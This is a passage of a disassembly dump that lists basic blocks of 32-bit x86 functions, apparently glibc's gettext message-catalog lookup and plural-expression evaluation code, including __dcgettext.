0xb0278c2:	mov	dword ptr [esp + 4], eax
0xb0278c6:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb0278cc:	mov	dword ptr [esp], eax
0xb0278cf:	call	0xb028340
None
|
|
|
v
0xb027877:	nop	
0xb027879:	nop	
0xb02787b:	nop	
0xb02787d:	nop	
0xb02787f:	nop	
0xb027880:	push	esi
0xb027881:	push	ebx
0xb027882:	sub	esp, 0x424
0xb027888:	call	0xb1267db
None
|
|
|
v
0xb02788d:	add	ebx, 0x183773
0xb027893:	lea	eax, dword ptr [esp + 0x20]
0xb027897:	mov	dword ptr [esp + 4], eax
0xb02789b:	mov	eax, dword ptr [esp + 0x430]
0xb0278a2:	mov	dword ptr [esp + 8], 0x400
0xb0278aa:	mov	dword ptr [esp], eax
0xb0278ad:	call	0xb07ac70
None
|
|
|
v
0xb027820:	push	ebx
0xb027821:	call	0xb1267db
None
|
|
|
v
0xb027937:	nop	
0xb027939:	nop	
0xb02793b:	nop	
0xb02793d:	nop	
0xb02793f:	nop	
0xb027940:	call	0xb1267df
None
|
|
|
v
0xb02784f:	mov	edx, dword ptr [esp + 0x3c]
0xb027853:	mov	dword ptr [esp + 0x10], edx
0xb027857:	mov	edx, dword ptr [esp + 0x38]
0xb02785b:	mov	dword ptr [esp], eax
0xb02785e:	mov	dword ptr [esp + 0xc], edx
0xb027862:	mov	edx, dword ptr [esp + 0x34]
0xb027866:	mov	dword ptr [esp + 8], edx
0xb02786a:	mov	edx, dword ptr [esp + 0x30]
0xb02786e:	mov	dword ptr [esp + 4], edx
0xb027872:	call	0xb027670
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__dcgettext
TOTAL BLOCKS :3
0xb02834d:	add	ebx, 0x182cb3
0xb028353:	mov	dword ptr [esp + 0x10], 0
0xb02835b:	mov	dword ptr [esp + 0xc], 0
0xb028363:	mov	dword ptr [esp + 0x14], eax
0xb028367:	mov	eax, dword ptr [esp + 0x34]
0xb02836b:	mov	dword ptr [esp + 8], 0
0xb028373:	mov	dword ptr [esp + 4], eax
0xb028377:	mov	eax, dword ptr [esp + 0x30]
0xb02837b:	mov	dword ptr [esp], eax
0xb02837e:	call	0xb0290c0
None
|
|
|
v
0xb028340:	push	ebx
0xb028341:	sub	esp, 0x28
0xb028344:	mov	eax, dword ptr [esp + 0x38]
0xb028348:	call	0xb1267db
None
|
|
|
v
0xb028383:	add	esp, 0x28
0xb028386:	pop	ebx
0xb028387:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0283f0
TOTAL BLOCKS :26
0xb0284aa:	mov	ecx, dword ptr [esi + 8]
0xb0284ad:	jmp	0xb028453
None
|
|
|
v
0xb028442:	mov	eax, dword ptr [esi + 8]
0xb028445:	mov	edx, edi
0xb028447:	call	0xb0283f0
None
|
|
|
v
0xb0284e4:	mov	eax, dword ptr [ebx + ecx*4 - 0x54a60]
0xb0284eb:	add	eax, ebx
0xb0284ed:	jmp	eax
None
|
|
|
v
0xb0284d6:	mov	ecx, dword ptr [esp + 0xc]
0xb0284da:	sub	ecx, 3
0xb0284dd:	cmp	ecx, 0xa
0xb0284e0:	mov	esi, eax
0xb0284e2:	ja	0xb0284b0
None
|
|
|
v
0xb0283f0:	push	ebp
0xb0283f1:	push	edi
0xb0283f2:	mov	edi, edx
0xb0283f4:	push	esi
0xb0283f5:	mov	esi, eax
0xb0283f7:	push	ebx
0xb0283f8:	sub	esp, 0x1c
0xb0283fb:	mov	eax, dword ptr [esi]
0xb0283fd:	call	0xb1267db
None
|
|
|
v
0xb0284c0:	test	eax, eax
0xb0284c2:	mov	cl, 1
0xb0284c4:	jne	0xb028453
None
|
|
|
v
0xb02849c:	mov	eax, dword ptr [esi + 4]
0xb02849f:	mov	ecx, edi
0xb0284a1:	test	eax, eax
0xb0284a3:	je	0xb028453
None
|
|
|
v
0xb028418:	cmp	eax, 3
0xb02841b:	nop	
0xb02841c:	lea	esi, dword ptr [esi]
0xb028420:	jne	0xb0284b0
None
|
|
|
v
0xb028474:	cmp	ecx, 0xe
0xb028477:	jne	0xb0284c8
None
|
|
|
v
0xb02847f:	mov	eax, dword ptr [esi + 0xc]
0xb028482:	mov	edx, edi
0xb028484:	call	0xb0283f0
None
|
|
|
v
0xb0284a5:	cmp	eax, 1
0xb0284a8:	jne	0xb0284b0
None
|
|
|
v
0xb02846a:	mov	ecx, dword ptr [esi + 4]
0xb02846d:	cmp	ecx, 0xf
0xb028470:	mov	ebp, eax
0xb028472:	je	0xb0284c0
None
|
|
|
v
0xb028426:	mov	eax, dword ptr [esi + 8]
0xb028429:	mov	edx, edi
0xb02842b:	call	0xb0283f0
None
|
|
|
v
0xb028479:	xor	cl, cl
0xb02847b:	test	eax, eax
0xb02847d:	je	0xb028453
None
|
|
|
v
0xb02840d:	jle	0xb028498
None
|
|
|
v
0xb0284c6:	jmp	0xb02847f
None
|
|
|
v
0xb028498:	test	eax, eax
0xb02849a:	jne	0xb0284b0
None
|
|
|
v
0xb028430:	cmp	eax, 1
0xb028433:	sbb	eax, eax
0xb028435:	not	eax
0xb028437:	mov	esi, dword ptr [esi + eax*4 + 0x10]
0xb02843b:	mov	eax, dword ptr [esi]
0xb02843d:	cmp	eax, 1
0xb028440:	jne	0xb02840d
None
|
|
|
v
0xb0284c8:	mov	eax, dword ptr [esi + 0xc]
0xb0284cb:	mov	edx, edi
0xb0284cd:	mov	dword ptr [esp + 0xc], ecx
0xb0284d1:	call	0xb0283f0
None
|
|
|
v
0xb028402:	add	ebx, 0x182bfe
0xb028408:	cmp	eax, 1
0xb02840b:	je	0xb028442
None
|
|
|
v
0xb028489:	xor	ecx, ecx
0xb02848b:	test	eax, eax
0xb02848d:	setne	cl
0xb028490:	jmp	0xb028453
None
|
|
|
v
0xb028413:	cmp	eax, 2
0xb028416:	je	0xb028460
None
|
|
|
v
0xb02844c:	xor	ecx, ecx
0xb02844e:	test	eax, eax
0xb028450:	sete	cl
0xb028453:	add	esp, 0x1c
0xb028456:	mov	eax, ecx
0xb028458:	pop	ebx
0xb028459:	pop	esi
0xb02845a:	pop	edi
0xb02845b:	pop	ebp
0xb02845c:	ret	
None
|
|
|
v
0xb028460:	mov	eax, dword ptr [esi + 8]
0xb028463:	mov	edx, edi
0xb028465:	call	0xb0283f0
None
|
|
|
v
0xb028453:	add	esp, 0x1c
0xb028456:	mov	eax, ecx
0xb028458:	pop	ebx
0xb028459:	pop	esi
0xb02845a:	pop	edi
0xb02845b:	pop	ebp
0xb02845c:	ret	
None
|
|
|
v
0xb0284b0:	add	esp, 0x1c
0xb0284b3:	xor	ecx, ecx
0xb0284b5:	pop	ebx
0xb0284b6:	mov	eax, ecx
0xb0284b8:	pop	esi
0xb0284b9:	pop	edi
0xb0284ba:	pop	ebp
0xb0284bb:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b028570
TOTAL BLOCKS :7
0xb0285ab:	add	eax, 1
0xb0285ae:	cmp	eax, esi
0xb0285b0:	jae	0xb0285c0
None
|
|
|
v
0xb028598:	mov	dword ptr [esp + 4], 0
0xb0285a0:	sub	ebp, 1
0xb0285a3:	mov	dword ptr [esp], eax
0xb0285a6:	call	0xb07ed60
None
|
|
|
v
0xb028588:	cmp	eax, dword ptr [esi + 0x64]
0xb02858b:	mov	esi, dword ptr [esp + 0x20]
0xb02858f:	cmovb	ebp, eax
0xb028592:	mov	eax, edi
0xb028594:	add	esi, edi
0xb028596:	jmp	0xb0285b2
None
|
|
|
v
0xb0285b2:	test	ebp, ebp
0xb0285b4:	jne	0xb028598
None
|
|
|
v
0xb0285b6:	add	esp, 0x10
0xb0285b9:	pop	esi
0xb0285ba:	pop	edi
0xb0285bb:	pop	ebp
0xb0285bc:	ret	4
None
|
|
|
v
0xb028570:	push	ebp
0xb028571:	mov	ebp, 0
0xb028576:	push	edi
0xb028577:	mov	edi, ecx
0xb028579:	push	esi
0xb02857a:	sub	esp, 0x10
0xb02857d:	mov	esi, dword ptr [eax + 8]
0xb028580:	mov	eax, dword ptr [esi + 0x60]
0xb028583:	call	0xb0283f0
None
|
|
|
v
0xb0285c0:	add	esp, 0x10
0xb0285c3:	mov	eax, edi
0xb0285c5:	pop	esi
0xb0285c6:	pop	edi
0xb0285c7:	pop	ebp
0xb0285c8:	ret	4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b028660
TOTAL BLOCKS :202
0xb0288ea:	jne	0xb0298c7
None
|
|
|
v
0xb02874b:	test	al, al
0xb02874d:	jne	0xb0287c2
None
|
|
|
v
0xb028e00:	add	eax, 1
0xb028e03:	cmp	dl, 0x2f
0xb028e06:	sete	dl
0xb028e09:	movzx	edx, dl
0xb028e0c:	add	esi, edx
0xb028e0e:	movzx	edx, byte ptr [eax]
0xb028e11:	test	dl, dl
0xb028e13:	jne	0xb028e00
None
|
|
|
v
0xb028f9e:	mov	eax, dword ptr [ebp - 0x48]
0xb028fa1:	jmp	0xb028de6
None
|
|
|
v
0xb028b07:	lea	edx, dword ptr [edi + 0x40]
0xb028b0a:	mov	eax, dword ptr [ebx + 0x38a8]
0xb028b10:	mov	dword ptr [esp], edx
0xb028b13:	ror	eax, 9
0xb028b16:	xor	eax, dword ptr gs:[0x18]
0xb028b1d:	call	eax
None
|
|
|
v
0xb028d1c:	test	eax, eax
0xb028d1e:	je	0xb028e88
None
|
|
|
v
0xb02898a:	mov	eax, dword ptr [ebp + 0xc]
0xb02898d:	mov	edi, dword ptr [ebp - 0x3c]
0xb028990:	mov	dword ptr [eax], edi
0xb028992:	mov	eax, dword ptr [ebp - 0x38]
0xb028995:	lea	esp, dword ptr [ebp - 0xc]
0xb028998:	pop	ebx
0xb028999:	pop	esi
0xb02899a:	pop	edi
0xb02899b:	pop	ebp
0xb02899c:	ret	8
None
|
|
|
v
0xb028f59:	mov	dword ptr [ebx + 0x1100], esi
0xb028f5f:	jmp	0xb028c6f
None
|
|
|
v
0xb028d90:	add	eax, 1
0xb028d93:	cmp	dl, 0x2f
0xb028d96:	sete	dl
0xb028d99:	movzx	edx, dl
0xb028d9c:	add	esi, edx
0xb028d9e:	movzx	edx, byte ptr [eax]
0xb028da1:	test	dl, dl
0xb028da3:	jne	0xb028d90
None
|
|
|
v
0xb028e43:	mov	edx, dword ptr [ecx + edx*4]
0xb028e46:	add	eax, 1
0xb028e49:	add	esi, 1
0xb028e4c:	mov	byte ptr [eax - 1], dl
0xb028e4f:	movsx	edx, byte ptr [esi]
0xb028e52:	test	dl, dl
0xb028e54:	jne	0xb028e43
None
|
|
|
v
0xb028ff2:	cmp	dword ptr [ebx + 0x38d8], 0
0xb028ff9:	je	0xb029013
None
|
|
|
v
0xb029907:	lea	ecx, dword ptr [ebx + 0x1110]
0xb02990d:	call	0xb0f9430
None
|
|
|
v
0xb029034:	mov	ecx, 1
0xb029039:	cmp	dword ptr gs:[0xc], 0
0xb029041:	je	0xb029044
None
|
|
|
v
0xb02874f:	mov	ecx, dword ptr [ebp - 0x44]
0xb028752:	mov	eax, dword ptr [ebp - 0x48]
0xb028755:	mov	edx, dword ptr [ebp - 0x40]
0xb028758:	add	eax, esi
0xb02875a:	add	edx, esi
0xb02875c:	cmp	esi, ecx
0xb02875e:	cmovb	eax, edx
0xb028761:	mov	esi, eax
0xb028763:	mov	edx, dword ptr [ebp - 0x38]
0xb028766:	mov	eax, dword ptr [edi + 0x30]
0xb028769:	test	edx, edx
0xb02876b:	mov	eax, dword ptr [eax + esi*4]
0xb02876e:	je	0xb028772
None
|
|
|
v
0xb028968:	mov	edx, dword ptr [ebp - 0x34]
0xb02896b:	mov	eax, dword ptr [edi + 0x28]
0xb02896e:	sub	edx, dword ptr [ebp - 0x2c]
0xb028971:	lea	eax, dword ptr [eax + edx*8]
0xb028974:	mov	ecx, dword ptr [eax + 4]
0xb028977:	mov	eax, dword ptr [eax]
0xb028979:	mov	dword ptr [ebp - 0x38], ecx
0xb02897c:	mov	dword ptr [ebp - 0x3c], eax
0xb02897f:	mov	eax, dword ptr [ebp + 8]
0xb028982:	test	eax, eax
0xb028984:	jne	0xb028806
None
|
|
|
v
0xb028ef0:	mov	eax, dword ptr [edi + 8]
0xb028ef3:	mov	eax, dword ptr [eax + esi*4]
0xb028ef6:	jmp	0xb0288c0
None
|
|
|
v
0xb0298e7:	lea	ecx, dword ptr [ebx + 0x1110]
0xb0298ed:	call	0xb0f9430
None
|
|
|
v
0xb029051:	mov	eax, dword ptr [ebp - 0x40]
0xb029054:	cmp	dword ptr [eax + 8], 0
0xb029058:	je	0xb029084
None
|
|
|
v
0xb028f43:	mov	edx, dword ptr [ebp - 0x30]
0xb028f46:	mov	ecx, dword ptr [ebp - 0x40]
0xb028f49:	mov	dword ptr [esp], eax
0xb028f4c:	mov	dword ptr [esp + 8], edx
0xb028f50:	mov	dword ptr [esp + 4], ecx
0xb028f54:	call	0xb07d0b0
None
|
|
|
v
0xb028763:	mov	edx, dword ptr [ebp - 0x38]
0xb028766:	mov	eax, dword ptr [edi + 0x30]
0xb028769:	test	edx, edx
0xb02876b:	mov	eax, dword ptr [eax + esi*4]
0xb02876e:	je	0xb028772
None
|
|
|
v
0xb02872f:	add	eax, edx
0xb028731:	mov	dword ptr [esp + 4], eax
0xb028735:	mov	eax, dword ptr [ebp - 0x34]
0xb028738:	mov	dword ptr [ebp - 0x30], ecx
0xb02873b:	mov	dword ptr [esp], eax
0xb02873e:	call	0xb07a740
None
|
|
|
v
0xb028af6:	mov	edi, dword ptr [ebp - 0x48]
0xb028af9:	mov	eax, dword ptr [ebx + 0x38d8]
0xb028aff:	test	eax, eax
0xb028b01:	je	0xb028891
None
|
|
|
v
0xb028e15:	mov	ecx, dword ptr [ebp - 0x44]
0xb028e18:	sub	eax, ecx
0xb028e1a:	movsx	edx, byte ptr [ecx]
0xb028e1d:	add	eax, 0x21
0xb028e20:	and	eax, 0xfffffff0
0xb028e23:	sub	esp, eax
0xb028e25:	lea	eax, dword ptr [esp + 0x1b]
0xb028e29:	and	eax, 0xfffffff0
0xb028e2c:	test	dl, dl
0xb028e2e:	mov	dword ptr [ebp - 0x44], eax
0xb028e31:	je	0xb028f96
None
|
|
|
v
0xb028e9b:	mov	eax, dword ptr [ebx + 0x110c]
0xb028ea1:	mov	edx, dword ptr [ebp - 0x20]
0xb028ea4:	mov	edi, dword ptr [ebp - 0x40]
0xb028ea7:	mov	esi, dword ptr [ebp - 0x34]
0xb028eaa:	sub	edx, eax
0xb028eac:	sub	edx, 4
0xb028eaf:	mov	dword ptr [eax], edx
0xb028eb1:	mov	edx, dword ptr [edi + 8]
0xb028eb4:	mov	dword ptr [edx + esi*4], eax
0xb028eb7:	mov	edx, dword ptr [ebp - 0x20]
0xb028eba:	sub	eax, edx
0xb028ebc:	add	eax, dword ptr [ebx + 0x1108]
0xb028ec2:	mov	ecx, eax
0xb028ec4:	and	eax, 0xfffffffc
0xb028ec7:	and	ecx, 3
0xb028eca:	add	edx, ecx
0xb028ecc:	mov	dword ptr [ebx + 0x110c], edx
0xb028ed2:	mov	dword ptr [ebx + 0x1108], eax
0xb028ed8:	cmp	dword ptr gs:[0xc], 0
0xb028ee0:	je	0xb028ee3
None
|
|
|
v
0xb028786:	mov	eax, dword ptr [edi + 0x24]
0xb028789:	mov	edx, ecx
0xb02878b:	sub	edx, dword ptr [ebp - 0x2c]
0xb02878e:	mov	byte ptr [ebp - 0x30], 0
0xb028792:	lea	edx, dword ptr [eax + edx*8]
0xb028795:	mov	eax, dword ptr [ebp - 0x3c]
0xb028798:	cmp	eax, dword ptr [edx]
0xb02879a:	jae	0xb0287ba
None
|
|
|
v
0xb029922:	jmp	0xb029072
None
|
|
|
v
0xb028fa6:	mov	byte ptr [eax + 1], 0x2f
0xb028faa:	add	eax, 0xa
0xb028fad:	mov	dword ptr [eax - 8], 0x4e415254
0xb028fb4:	mov	dword ptr [eax - 4], 0x54494c53
0xb028fbb:	jmp	0xb028def
None
|
|
|
v
0xb028a04:	mov	eax, 0xffffffff
0xb028a09:	jmp	0xb0288f2
None
|
|
|
v
0xb028de3:	mov	esi, dword ptr [ebp - 0x50]
0xb028de6:	cmp	esi, 1
0xb028de9:	jbe	0xb028f64
None
|
|
|
v
0xb028886:	mov	ecx, dword ptr [ebp - 0x40]
0xb028889:	test	ecx, ecx
0xb02888b:	je	0xb028a9c
None
|
|
|
v
0xb028b33:	lock cmpxchg	dword ptr [ebx + 0x1110], ecx
0xb028b3b:	jne	0xb0298e7
None
|
|
|
v
0xb0287ba:	movzx	eax, byte ptr [ebp - 0x30]
0xb0287be:	test	al, al
0xb0287c0:	je	0xb02874f
None
|
|
|
v
0xb028b68:	test	edi, edi
0xb028b6a:	je	0xb028c13
None
|
|
|
v
0xb028a0e:	mov	edi, dword ptr [ebp - 0x48]
0xb028a11:	mov	dword ptr [ebp - 0x40], 0
0xb028a18:	jmp	0xb02887b
None
|
|
|
v
0xb0289b5:	jmp	0xb028688
None
|
|
|
v
0xb028ab8:	mov	ecx, eax
0xb028aba:	mov	dword ptr [ebp - 0x44], eax
0xb028abd:	lea	eax, dword ptr [esi + esi*2]
0xb028ac0:	lea	edx, dword ptr [ecx + eax*4 - 0xc]
0xb028ac4:	mov	dword ptr [ebp - 0x48], edi
0xb028ac7:	mov	edi, edx
0xb028ac9:	mov	dword ptr [ebp - 0x4c], esi
0xb028acc:	jmp	0xb028adb
None
|
|
|
v
0xb028875:	mov	dword ptr [ebp - 0x40], edi
0xb028878:	mov	edi, dword ptr [ebp - 0x48]
0xb02887b:	mov	esi, dword ptr [ebp - 0x44]
0xb02887e:	test	esi, esi
0xb028880:	jne	0xb028a59
None
|
|
|
v
0xb02881f:	mov	eax, dword ptr [ebx + 0x38d8]
0xb028825:	mov	dword ptr [ebp - 0x44], 0
0xb02882c:	test	eax, eax
0xb02882e:	jne	0xb028a76
None
|
|
|
v
0xb029072:	mov	eax, dword ptr [ebp - 0x40]
0xb029075:	mov	eax, dword ptr [eax + 8]
0xb029078:	jmp	0xb0288a9
None
|
|
|
v
0xb029064:	lock sub	dword ptr [ebx + 0x1110], 1
None
|
|
|
v
0xb0287c5:	mov	eax, dword ptr [ebp - 0x2c]
0xb0287c8:	cmp	dword ptr [ebp - 0x34], eax
0xb0287cb:	jae	0xb028968
None
|
|
|
v
0xb028eea:	jne	0xb0298f7
None
|
|
|
v
0xb028d24:	movzx	edx, byte ptr [eax + 8]
0xb028d28:	lea	esi, dword ptr [eax + 8]
0xb028d2b:	test	dl, 0xdf
0xb028d2e:	je	0xb02907d
None
|
|
|
v
0xb02879c:	mov	eax, dword ptr [edx + 4]
0xb02879f:	mov	dword ptr [ebp - 0x4c], ecx
0xb0287a2:	mov	dword ptr [esp + 4], eax
0xb0287a6:	mov	eax, dword ptr [ebp - 0x34]
0xb0287a9:	mov	dword ptr [esp], eax
0xb0287ac:	call	0xb07a740
None
|
|
|
v
0xb028d88:	mov	byte ptr [eax], 0
0xb028d8b:	mov	eax, dword ptr [ebp - 0x30]
0xb028d8e:	jmp	0xb028d9e
None
|
|
|
v
0xb028f96:	mov	eax, dword ptr [ebp - 0x44]
0xb028f99:	jmp	0xb028e59
None
|
|
|
v
0xb028a1d:	mov	eax, dword ptr [ebx + 0x1104]
0xb028a23:	test	eax, eax
0xb028a25:	je	0xb028c4e
None
|
|
|
v
0xb028f2f:	lea	edx, dword ptr [eax + 1]
0xb028f32:	mov	dword ptr [esp], edx
0xb028f35:	mov	dword ptr [ebp - 0x30], edx
0xb028f38:	call	0xb0173f0
None
|
|
|
v
0xb028d9e:	movzx	edx, byte ptr [eax]
0xb028da1:	test	dl, dl
0xb028da3:	jne	0xb028d90
None
|
|
|
v
0xb02892c:	mov	esi, dword ptr [ebp - 0x30]
0xb02892f:	mov	ecx, dword ptr [ebp - 0x40]
0xb028932:	add	esi, dword ptr [ebp - 0x38]
0xb028935:	mov	eax, dword ptr [edi + 0x18]
0xb028938:	shr	esi, 1
0xb02893a:	test	ecx, ecx
0xb02893c:	mov	eax, dword ptr [eax + esi*8 + 4]
0xb028940:	je	0xb028944
None
|
|
|
v
0xb02909a:	mov	edi, dword ptr [ebp - 0x40]
0xb02909d:	test	eax, eax
0xb02909f:	mov	dword ptr [edi + 8], eax
0xb0290a2:	jne	0xb028b41
None
|
|
|
v
0xb028fcd:	lea	edx, dword ptr [edi + 0x40]
0xb028fd0:	mov	eax, dword ptr [ebx + 0x38a8]
0xb028fd6:	mov	dword ptr [esp], edx
0xb028fd9:	ror	eax, 9
0xb028fdc:	xor	eax, dword ptr gs:[0x18]
0xb028fe3:	call	eax
None
|
|
|
v
0xb0298f7:	lea	eax, dword ptr [ebx + 0x1110]
0xb0298fd:	call	0xb0f9460
None
|
|
|
v
0xb028b24:	mov	ecx, 1
0xb028b29:	cmp	dword ptr gs:[0xc], 0
0xb028b31:	je	0xb028b34
None
|
|
|
v
0xb0288b2:	mov	edi, dword ptr [ebp - 0x34]
0xb0288b5:	mov	eax, dword ptr [eax + edi*4]
0xb0288b8:	test	eax, eax
0xb0288ba:	je	0xb028b24
None
|
|
|
v
0xb028942:	bswap	eax
0xb028944:	add	eax, dword ptr [ebp - 0x3c]
0xb028947:	mov	dword ptr [esp + 4], eax
0xb02894b:	mov	eax, dword ptr [ebp - 0x34]
0xb02894e:	mov	dword ptr [esp], eax
0xb028951:	call	0xb07a740
None
|
|
|
v
0xb028834:	mov	esi, dword ptr [edi + 0x3c]
0xb028837:	test	esi, esi
0xb028839:	je	0xb028efb
None
|
|
|
v
0xb028956:	test	eax, eax
0xb028958:	jns	0xb028910
None
|
|
|
v
0xb028e88:	mov	eax, dword ptr [ebp - 0x40]
0xb028e8b:	mov	dword ptr [eax + 8], 0
0xb028e92:	add	dword ptr [edi + 0x3c], 1
0xb028e96:	jmp	0xb028af9
None
|
|
|
v
0xb029084:	mov	eax, dword ptr [ebp - 0x2c]
0xb029087:	mov	dword ptr [esp + 4], 4
0xb02908f:	add	eax, dword ptr [edi + 0x20]
0xb029092:	mov	dword ptr [esp], eax
0xb029095:	call	0xb017450
None
|
|
|
v
0xb0286f8:	mov	eax, dword ptr [edi + 0xc]
0xb0286fb:	mov	dword ptr [ebp - 0x4c], eax
0xb0286fe:	test	eax, eax
0xb028700:	mov	eax, dword ptr [edi + 0x18]
0xb028703:	mov	dword ptr [ebp - 0x50], eax
0xb028706:	mov	eax, dword ptr [eax + ecx*8]
0xb028709:	je	0xb0288d0
None
|
|
|
v
0xb028cb7:	test	eax, eax
0xb028cb9:	mov	ecx, eax
0xb028cbb:	mov	dword ptr [ebp - 0x30], eax
0xb028cbe:	je	0xb028fc0
None
|
|
|
v
0xb02877a:	lea	ecx, dword ptr [eax - 1]
0xb02877d:	cmp	dword ptr [ebp - 0x2c], ecx
0xb028780:	ja	0xb0286f8
None
|
|
|
v
0xb02885b:	mov	ecx, dword ptr [ebp - 0x30]
0xb02885e:	mov	edi, eax
0xb028860:	sub	esi, 1
0xb028863:	mov	dword ptr [esp + 4], ecx
0xb028867:	mov	eax, dword ptr [eax]
0xb028869:	mov	dword ptr [esp], eax
0xb02886c:	call	0xb07a740
None
|
|
|
v
0xb028a71:	jmp	0xb028886
None
|
|
|
v
0xb028c05:	mov	eax, dword ptr [ebp - 0x38]
0xb028c08:	test	edi, edi
0xb028c0a:	mov	dword ptr [ebp - 0x24], eax
0xb028c0d:	jne	0xb028b70
None
|
|
|
v
0xb028b1f:	jmp	0xb028891
None
|
|
|
v
0xb0286bd:	mov	ecx, dword ptr [edi + 0x2c]
0xb0286c0:	xor	edx, edx
0xb0286c2:	mov	dword ptr [ebp - 0x30], eax
0xb0286c5:	div	ecx
0xb0286c7:	mov	eax, dword ptr [ebp - 0x30]
0xb0286ca:	mov	esi, edx
0xb0286cc:	lea	edx, dword ptr [ecx - 2]
0xb0286cf:	mov	dword ptr [ebp - 0x38], edx
0xb0286d2:	xor	edx, edx
0xb0286d4:	div	dword ptr [ebp - 0x38]
0xb0286d7:	lea	eax, dword ptr [edx + 1]
0xb0286da:	mov	edx, dword ptr [edi + 0x34]
0xb0286dd:	mov	dword ptr [ebp - 0x40], eax
0xb0286e0:	mov	dword ptr [ebp - 0x38], edx
0xb0286e3:	mov	edx, ecx
0xb0286e5:	sub	edx, eax
0xb0286e7:	sub	eax, ecx
0xb0286e9:	mov	dword ptr [ebp - 0x44], edx
0xb0286ec:	mov	dword ptr [ebp - 0x48], eax
0xb0286ef:	jmp	0xb028763
None
|
|
|
v
0xb028b70:	add	edi, 1
0xb028b73:	mov	edx, dword ptr [ebx + 0x1140]
0xb028b79:	imul	esi, edi, 0xff0
0xb028b7f:	mov	dword ptr [esp], edx
0xb028b82:	mov	dword ptr [esp + 4], esi
0xb028b86:	mov	dword ptr [ebp - 0x2c], edx
0xb028b89:	mov	dword ptr [ebx + 0x1108], esi
0xb028b8f:	call	0xb0173e0
None
|
|
|
v
0xb028fc0:	cmp	dword ptr [ebx + 0x38d8], 0
0xb028fc7:	je	0xb028a04
None
|
|
|
v
0xb028def:	mov	byte ptr [eax], 0
0xb028df2:	xor	esi, esi
0xb028df4:	mov	eax, dword ptr [ebp - 0x44]
0xb028df7:	jmp	0xb028e0e
None
|
|
|
v
0xb029013:	mov	eax, dword ptr [ebp - 0x30]
0xb029016:	mov	dword ptr [esp], eax
0xb029019:	call	0xb017470
None
|
|
|
v
0xb0287e7:	mov	ecx, dword ptr [edx + 4]
0xb0287ea:	bswap	ecx
0xb0287ec:	add	eax, ecx
0xb0287ee:	mov	dword ptr [ebp - 0x38], eax
0xb0287f1:	mov	eax, dword ptr [edx]
0xb0287f3:	bswap	eax
0xb0287f5:	add	eax, 1
0xb0287f8:	mov	dword ptr [ebp - 0x3c], eax
0xb0287fb:	mov	eax, dword ptr [ebp + 8]
0xb0287fe:	test	eax, eax
0xb028800:	je	0xb02898a
None
|
|
|
v
0xb0287c2:	mov	dword ptr [ebp - 0x34], ecx
0xb0287c5:	mov	eax, dword ptr [ebp - 0x2c]
0xb0287c8:	cmp	dword ptr [ebp - 0x34], eax
0xb0287cb:	jae	0xb028968
None
|
|
|
v
0xb028b9f:	mov	dword ptr [ebx + 0x1140], eax
0xb028ba5:	lea	edx, dword ptr [esi - 4]
0xb028ba8:	lea	ecx, dword ptr [eax + 4]
0xb028bab:	add	eax, 8
0xb028bae:	mov	dword ptr [ebx + 0x110c], ecx
0xb028bb4:	mov	dword ptr [ebx + 0x1108], edx
0xb028bba:	mov	dword ptr [ebp - 0x20], eax
0xb028bbd:	cmp	edx, 3
0xb028bc0:	jbe	0xb028b68
None
|
|
|
v
0xb028e62:	mov	byte ptr [eax], 0
0xb028e65:	mov	eax, dword ptr [ebp - 0x40]
0xb028e68:	mov	edx, dword ptr [ebp - 0x44]
0xb028e6b:	mov	dword ptr [esp], 1
0xb028e72:	lea	ecx, dword ptr [eax + 4]
0xb028e75:	mov	eax, dword ptr [ebp - 0x48]
0xb028e78:	call	0xb01aaf0
None
|
|
|
v
0xb02870f:	bswap	eax
0xb028711:	mov	dword ptr [ebp - 0x30], eax
0xb028714:	mov	edx, dword ptr [ebp - 0x3c]
0xb028717:	xor	eax, eax
0xb028719:	cmp	dword ptr [ebp - 0x30], edx
0xb02871c:	jb	0xb02874b
None
|
|
|
v
0xb0288f0:	xor	eax, eax
0xb0288f2:	lea	esp, dword ptr [ebp - 0xc]
0xb0288f5:	pop	ebx
0xb0288f6:	pop	esi
0xb0288f7:	pop	edi
0xb0288f8:	pop	ebp
0xb0288f9:	ret	8
None
|
|
|
v
0xb0289d8:	mov	dword ptr [ebx + 0x110c], 0
0xb0289e2:	mov	dword ptr [ebx + 0x1108], 0
0xb0289ec:	cmp	dword ptr gs:[0xc], 0
0xb0289f4:	je	0xb0289f7
None
|
|
|
v
0xb028d02:	test	eax, eax
0xb028d04:	je	0xb028e88
None
|
|
|
v
0xb02897f:	mov	eax, dword ptr [ebp + 8]
0xb028982:	test	eax, eax
0xb028984:	jne	0xb028806
None
|
|
|
v
0xb028806:	mov	eax, dword ptr [ebp - 0x58]
0xb028809:	test	eax, eax
0xb02880b:	je	0xb028a1d
None
|
|
|
v
0xb028944:	add	eax, dword ptr [ebp - 0x3c]
0xb028947:	mov	dword ptr [esp + 4], eax
0xb02894b:	mov	eax, dword ptr [ebp - 0x34]
0xb02894e:	mov	dword ptr [esp], eax
0xb028951:	call	0xb07a740
None
|
|
|
v
0xb028696:	mov	ecx, dword ptr [edi + 0x30]
0xb028699:	mov	eax, dword ptr [edi + 0x14]
0xb02869c:	test	ecx, ecx
0xb02869e:	mov	dword ptr [ebp - 0x2c], eax
0xb0286a1:	je	0xb028900
None
|
|
|
v
0xb028d61:	lea	eax, dword ptr [edx + 0x1f]
0xb028d64:	and	eax, 0xfffffff0
0xb028d67:	sub	esp, eax
0xb028d69:	lea	eax, dword ptr [esp + 0x1b]
0xb028d6d:	and	eax, 0xfffffff0
0xb028d70:	mov	dword ptr [esp + 4], esi
0xb028d74:	xor	esi, esi
0xb028d76:	mov	dword ptr [esp + 8], edx
0xb028d7a:	mov	dword ptr [esp], eax
0xb028d7d:	mov	dword ptr [ebp - 0x44], eax
0xb028d80:	mov	dword ptr [ebp - 0x4c], eax
0xb028d83:	call	0xb07cad0
None
|
|
|
v
0xb028e56:	mov	esi, dword ptr [ebp - 0x50]
0xb028e59:	cmp	esi, 1
0xb028e5c:	jbe	0xb028f73
None
|
|
|
v
0xb028900:	xor	esi, esi
0xb028902:	mov	dword ptr [ebp - 0x30], eax
0xb028905:	mov	edx, esi
0xb028907:	jmp	0xb028919
None
|
|
|
v
0xb02907d:	xor	edx, edx
